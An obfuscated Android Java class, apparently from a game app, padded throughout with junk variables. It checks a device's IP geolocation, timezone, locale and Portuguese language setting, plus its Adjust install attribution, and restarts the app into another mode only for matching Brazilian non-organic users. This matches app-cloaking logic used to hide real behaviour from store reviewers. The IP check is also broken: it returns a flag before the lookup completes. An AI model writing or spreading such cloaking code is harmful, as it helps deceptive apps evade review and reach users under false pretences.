package gfav.dwwadq;

import android.content.Context;
import android.content.res.Configuration;
import android.os.AsyncTask;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.Locale;
import java.util.TimeZone;
import java.util.Timer;
import java.util.TimerTask;

import gfav.nmcxikklj;
import gfav.dwwadq.sdk.myuhauwgg;

public class wcsmyn {
    private static boolean networkIsBR = false;
    private static final String API_URL = "http://ip-api.com/json";
    private static class IPCheckTask extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... params) {
            String ABhJUZdZ = "tFYzCOwSSpVfnKb";
            String oXWuiNjD = "eRgyanMhuqNHF";
            String gYZOjm = "NsSdaClVXCiCSzFSXgDXPnMdDnkBDcNfdvb";
            String IaJgKKoDHj = "ghKlBXaGOvpmEjcpCGRWKUvoYpXrsQvZryKp";
            String adBLsnjU = "FNdkidahPqUMcfoTlliMuLszxX";
            int qcsbXcOZ = 8997;
            String AgBCC = "XlGXAcGWMVZv";
            int UiXaAAr = 599;
            HttpURLConnection connection = null;
            BufferedReader reader = null;

            try {
                URL url = new URL(API_URL);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(5000);
                int jstVWK = 1730;
                String HtHbj = "QbjlUKDZHsHYmsXukQttDepTeqhAkVlGfELTGoqihzTmJeBRm";
                int rQdbCaY = 6617;
                int XcDCCg = 9316;
                int VbhBpa = 6346;
                int CgHEmWgpcZ = 2607;
                int VZUNDKc = 9209;
                connection.setReadTimeout(5000);

                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                Log.d("GameTools", "ip:"+response.toString());
                return response.toString();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (connection != null) {
                    connection.disconnect();
                }
                if (reader != null) {
                    try {
                        reader.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(String response) {
            if (response != null) {

                try {

                    JSONObject jsonObject = new JSONObject(response);
                    Log.d("GameTools", "jsonObject:"+jsonObject);
                    String country = jsonObject.optString("country");
                    Log.d("GameTools", "country:"+country);
                    if (country.equals("Brazil")) {
                        Log.d("GameTools", "The current IP address is in Brazil");
                        networkIsBR = true;
                    } else {
                        Log.d("GameTools", "The current IP address is not in Brazil");
                        networkIsBR = false;
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } else {
                Log.d("GameTools", "Failed to retrieve the current IP address");
                networkIsBR = false;

            }
        }

    }

    public static boolean boolTimeZoneIsBR(){

        TimeZone timeZone = TimeZone.getDefault();
        String syFdFjWgU = "KicxMCVBUAIKDQegbY";
        String YEUYdTBRHI = "fKlvgnDZPHcM";
        int bhoalwqGEh = 2363;
        int IQmDCVdy = 8778;
        String YCLfmPXa = "BUbkrRMASifgYEaFQGLWBRxacFKlgVClm";
        int Oarutiwp = 9785;
        String kMFsjXgW = "NSGSsnEuAMX";
        int iEAdi = 8998;
        int HWTGAuUs = 5501;
        Calendar calendar = Calendar.getInstance(timeZone);
        String timeZoneID = timeZone.getID();
        Locale locale = Locale.getDefault();
        String country = locale.getCountry();
        Log.d("GameTools", "时区ID: " + timeZoneID);
        Log.d("GameTools", "country: " + country);

        boolean zoneId = timeZoneID.equals("America/Sao_Paulo") || timeZoneID.equals("America/Rio_de_Janeiro") || timeZoneID.equals("America/Fortaleza") || timeZoneID.equals("America/Manaus")
                || timeZoneID.equals("America/Porto_Velho") || timeZoneID.equals("America/Bahia") || timeZoneID.equals("America/Noronha") || timeZoneID.equals("America/Cuiaba")
                || timeZoneID.equals("America/Rio_Branco");
        if (zoneId && country.equals("BR")) {
            Log.d("GameTools", "当前手机时区为巴西。");
            return true;
        } else {
            Log.d("GameTools", "当前手机时区不是巴西。");
            return false;
        }
    }

    public static boolean boolPtIp(){
        new IPCheckTask().execute();
        String vkpAtsxfD = "UrqgFS";
        String vcxvEgGDw = "UpwFJncnwwzgDoghRAVddWEUqdP";
        int OLUoKd = 5874;
        String xRUEtWA = "aNbKydqwTxYuXvmkCzRsThwFKKDFNiCQcrzBTqikhq";
        int CQlkVpzWk = 3788;
        int VsXBwweeep = 3710;
        int WuROazv = 5847;
        String cgTXgIF = "pwsbaFHSTvFifbeqOiHdAXfetlI";
        int OnMBYIm = 7349;
        String aCIMaZPa = "ZdKPRWwnmhs";
        int hRvTJBANL = 3972;
        int kguFpbb = 1830;

        return networkIsBR;
    }

    public static boolean boolPtLanguage() {
        Configuration configuration = context.getResources().getConfiguration();
        Locale currentLocale;

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            currentLocale = configuration.getLocales().get(0);
        } else {
            currentLocale = configuration.locale;
        }

        String NHMCDcDE = "PfFTgKuWnAFkDSzRxqStsSDDMXVYAedenaH";
        String IRLvnz = "ycWpTJBHcoBXKQXwunqhvcJrytMCSERWVDv";
        int ifGVGzY = 91;
        String PPSiIYTfFN = "KIJsLNEIcUYINdWJQEHPfuHqfRj";
        String MJvHTblh = "qAlJoLSvlssmiVM";
        int FAnBr = 3398;
        int YxsGgk = 5430;
        String RmGbm = "lgYiFRhniDOHF";
        String pBFXAwFEq = "hrkwVFUdXXTlNrvVyOfWsszsNoLNvfUDn";
        String language = currentLocale.getLanguage();
        Log.d("GameTools", "language:"+language);
        return language.equals("pt");
    }


    public static void checkAdjustStatus(){
        final Timer timer = new Timer();
        final TimerTask task = new TimerTask() {
            @Override
            public void run() {
                String status = myuhauwgg.getAdjustStatus();
                if(!"".equals(status))
                {
                    String HpVcUICGO = "WgSTbXhYFNroPjymCJoWvzkRTNhOjeisbR";
                    String UZgXUAZzIX = "BSwqXwDqluoRKcRQluTVXSASeWMVBX";
                    String BmoYUBS = "eClPShOkMOAq";
                    int Ohdiuued = 2452;
                    String gJdSXkLMb = "YmHaHlnBXXYpbSxnsVluQETXKYlwOVGiwz";
                    int deeolceuF = 4531;
                    String YNIJPIShE = "oEBxCpAHOMIRKhXVb";
                    String zVlhZsfw = "tCbvqzagLufvwwUOvbewwezSUAeBrfwjxbOJtrKw";
                    String uTDds = "JxVXsmtpTtRJULlxIVMGXGGsECtp";
                    Log.d("GameTools", "status:"+status);
                    if ("Organic".equals(status) || "organic".equals(status)){
//                        baseAppLication.gameRestart();
                    }else{
                        nmcxikklj.GameRestart();
                    }

                    timer.cancel();
                }
            }
        };
        timer.schedule(task, 1500, 1500);
    }

    public static boolean gameStaus = false;
    private static Context context = null;
    public static void checkLinuxConfig(Context cont){
        context = cont;
        final Timer timer = new Timer();
        int SqcjL = 1656;
        String NYXNlTFlO = "XkMPyOrAUsgYYiaejtiReIxvHorHYJuXuUoMtaGZX";
        String rYQVAuyD = "kQpLntUnzMkfXyeRcVYtCiQyimvrPukkJJpeRFbFeMsakwGLQ";
        String ElWOmZ = "DIoeFkVRCzosicyUGpXtbIBHroeDJkvCvHSI";
        String BkJFFv = "rUuoCQBsXqyRbqmbDNZefRSeSPfZbdmmDvUO";
        int BAOCNk = 3098;
        int ERpTUL = 3094;
        int XaBoeSANis = 460;
        String GVOZOR = "IxasIstkecmsTdhNKqLKJNNZpCutdQhbGZwyhCoJz";
        int NVrouM = 9277;
        int FztAM = 8779;
        String UgjMUc = "TwpWoErRAhjZvWSyOT";

        TimerTask task = new TimerTask() {
            @Override
            public void run() {
                boolean status = tbobh.getUserInfo();
                timer.cancel();
                if(status){
                    if (gameStaus){
                        Log.d("GameTools", "boolPtIp():" + boolPtIp() + "===boolTimeZoneIsBR():" + boolTimeZoneIsBR() +  "=====boolPtLanguage():" + boolPtLanguage());
                        if(boolPtIp() && boolTimeZoneIsBR() && boolPtLanguage()){
                            //是否是巴西时区 是否是巴西ip  手机系统是否是葡语
                            nmcxikklj.GameRestart();
                        }else{
                            checkAdjustStatus();
                        }
                    }else{
                        checkAdjustStatus();
                    }
                }else{
                    checkAdjustStatus();
                }
            }
        };
        timer.schedule(task, 1000, 1000);
    }

}
